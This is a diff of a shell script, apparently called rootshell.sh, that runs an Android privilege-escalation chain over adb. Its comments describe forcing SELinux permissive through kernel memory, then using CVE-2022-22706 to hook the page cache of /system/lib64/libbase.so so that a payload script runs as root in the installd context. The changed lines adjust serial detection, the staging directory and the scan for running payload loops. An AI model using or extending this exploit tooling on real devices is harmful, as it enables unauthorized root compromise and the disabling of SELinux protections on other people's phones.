@@ -7,7 +7,7 @@
 #
 # Two per-boot primitives, in this order:
 #   1. SELinux permissive  -- `mali_boot switch` (policydb.permissive_map +
-#      AVC eviction; docs/routes/SELINUX-SWITCH.md).  Kernel memory only.
+#      AVC eviction).  Kernel memory only, no policy reload.
 #   2. uid-0 / u:r:installd:s0 -- CVE-2022-22706 page-cache hook in
 #      /system/lib64/libbase.so (GetBoolProperty -> payload -> sh r.sh).
 #      The hook page is restored as soon as the channel is up; the channel
@@ -17,8 +17,11 @@
 # /dev/block/by-name, etc. -- things installd was MAC-denied with MAC on.
 set -u
 REPO=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
-SER=${SER:-0123456789ABCDEF}
-D=/data/local/tmp
+if [ -z "${SER:-}" ]; then
+  SER=$(adb devices | awk 'NR>1 && $2=="device" {print $1; exit}')
+  [ -n "$SER" ] || { echo "rootshell.sh: set SER=<serial> (adb devices)"; exit 2; }
+fi
+D=${SU_DIR:-/data/local/tmp}
 LIB=/system/lib64/libbase.so
 A="adb -s $SER"
 X=$REPO/channel
@@ -65,7 +68,7 @@ $A shell 'cmd package compile -m speed -f com.neutronized.supercattales2' \
 # wait for the loops, then keep exactly one (the hook fires per cold call)
 LOOPS=""
 for _ in $(seq 1 30); do
-  LOOPS=$($A shell 'for p in /proc/[0-9]*; do c=$(tr "\0" " " < $p/cmdline 2>/dev/null); case "$c" in "sh /data/local/tmp/r.sh"*) echo ${p#/proc/};; esac; done' 2>/dev/null | tr -d '\r')
+  LOOPS=$($A shell "for p in /proc/[0-9]*; do c=\$(tr '\\0' ' ' < \$p/cmdline 2>/dev/null); case \"\$c\" in 'sh $D/r.sh'*) echo \${p#/proc/};; esac; done" 2>/dev/null | tr -d '\r')
   [ -n "$LOOPS" ] && break
   sleep 1
 done
